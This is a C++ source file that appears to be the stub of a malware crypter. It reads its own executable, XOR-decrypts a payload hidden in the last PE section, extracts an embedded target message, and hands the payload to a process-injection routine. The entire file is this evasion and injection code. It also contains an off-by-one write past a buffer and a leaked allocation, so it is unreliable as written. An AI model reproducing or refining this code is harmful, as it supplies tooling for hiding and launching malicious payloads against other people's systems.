#include <Windows.h>
#include <iostream>
#include <string>
#include <algorithm>
#include "..\..\C++ Helper\Injector\Injector.h"
#include "..\..\C++ Helper\PE\PE.h"

struct Data
{
	DWORD PayloadLocation, PayloadSize, MessageSize, MessageLocation;
};


char* getMessage(BYTE* Bytearray, DWORD Size)
{
	char* chararray = new char[Size + 1];
	memcpy_s(chararray, Size + 1, Bytearray, Size);
	chararray[Size] = 0;

	DWORD count;
	for (count = 1; count <= Size; count++) {
		if (chararray[count] == 0x0)
			break;
	}
	if (count == 1)
		return 0x0;

	char* Message = new char[count];
	Message[count] = 0;
	memcpy_s(Message, count, chararray, count);
	return Message;
}

int main(int argc, char* argv[])
{
	PE Loader = PE((const char*)argv[0]);
	if (!Loader.isLoaded())
		return 0;
	Loader.PrintInfo();

	IMAGE_SECTION_HEADER* section = Loader.getSectionHeaderAt(Loader.getSectionCount() - 1);

	Data* PayloadData = (Data*)(section->PointerToRawData + Loader.getLocation());

	printf("Decrypting...\n");
	XOR((BYTE*)(section->PointerToRawData + Loader.getLocation()), section->SizeOfRawData);
	printf("Decrypted!!!\n");

	PE Payload = PE(section->PointerToRawData + Loader.getLocation() + PayloadData->PayloadLocation, PayloadData->PayloadSize);

	printf("Section: \t\t0x%X\n", Loader.getLocation() + section->PointerToRawData);
	printf("Loaded Payload at: \t0x%X\n", Payload.getLocation());
	printf("Payload Size: \t\t%X\n", Payload.getSize());

	BYTE* Bytearray = new BYTE[PayloadData->MessageSize];
	Bytearray = (BYTE*)(section->PointerToRawData + PayloadData->MessageLocation + Loader.getLocation());
	printf("Message at: 0x%X\n", Loader.getLocation() + section->PointerToRawData + PayloadData->MessageLocation);
	printf("Message size: %d\n", PayloadData->MessageSize);
	const char* Message = getMessage(Bytearray, PayloadData->MessageSize);
	if(Message != 0x0)
		printf("Found Message: \t\t%s\n", Message);
	else
	{
		printf("Found no Message\n");
		return -1;
	}

	Injector(Payload, Message);
	return 0;
}